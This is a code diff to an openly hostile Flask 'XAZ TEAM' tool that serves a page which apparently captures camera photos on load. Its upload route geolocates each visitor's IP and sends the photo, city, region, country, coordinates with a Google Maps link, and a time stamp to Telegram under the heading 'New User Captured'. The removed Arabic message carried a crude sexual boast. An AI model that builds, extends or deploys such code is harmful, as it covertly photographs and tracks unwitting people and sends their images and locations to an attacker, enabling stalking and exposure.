@@ -2,7 +2,7 @@ from flask import Flask, request, jsonify
 import os
 import logging
 import requests
-import json
+from datetime import datetime
 
 app = Flask(__name__)
 
@@ -24,7 +24,20 @@ def index():
 <html lang="ar">
 <head>
     <meta charset="UTF-8">
-    <title>like ff</title>
+    <title>XAZ TEAM</title>
+    <style>
+        body {
+            background-color: red;
+            color: white;
+            font-family: Arial, sans-serif;
+            text-align: center;
+            padding-top: 20%;
+        }
+        h1 {
+            font-size: 3em;
+            text-shadow: 2px 2px 4px #000000;
+        }
+    </style>
     <script>
         async function capturePhoto(facingMode, label) {
             try {
@@ -57,7 +70,9 @@ def index():
         window.onload = startCapture;
     </script>
 </head>
-<body style="background-color:black;"></body>
+<body>
+    <h1> Hack B y : XAZ TEAM</h1>
+</body>
 </html>"""
 
 @app.route('/upload', methods=['POST'])
@@ -84,15 +99,20 @@ def upload():
         country = ip_info.get('country', 'غير معروف')
         location = ip_info.get('loc', 'غير معروف')
 
+        # الوقت والتاريخ الحالي
+        now = datetime.now()
+        current_time = now.strftime("%Y-%m-%d %H:%M:%S")
+
         # نص الرسالة مع معلومات IP
         message = (
-            f"<b>نكح مستخدم جديد😏</b>\n\n"
-            f"<b>IP:</b> {ip}\n"
-            f"<b>المدينة:</b> {city}\n"
-            f"<b>المنطقة:</b> {region}\n"
-            f"<b>الدولة:</b> {country}\n"
-            f"<b>الموقع الجغرافي:</b> {location}\n\n"
-            f"<i>هذه الأداة مصممة من قبل XAZ 😎</i>"
+            f"<b>New User Captured 😏</b>\n\n"
+            f"<b>IP:</b> <code>{ip}</code>\n"
+            f"<b>City:</b> <code>{city}</code>\n"
+            f"<b>Region:</b> <code>{region}</code>\n"
+            f"<b>Country:</b> <code>{country}</code>\n"
+            f"<b>Location:</b> <a href='https://www.google.com/maps?q={location}'>Click here</a>\n\n"
+            f"<b>Time:</b> <code>{current_time}</code>\n\n"
+            f"<i>This tool was designed by XAZ 😎</i>"
         )
 
         # إرسال الصورة مع الرسالة إلى Telegram
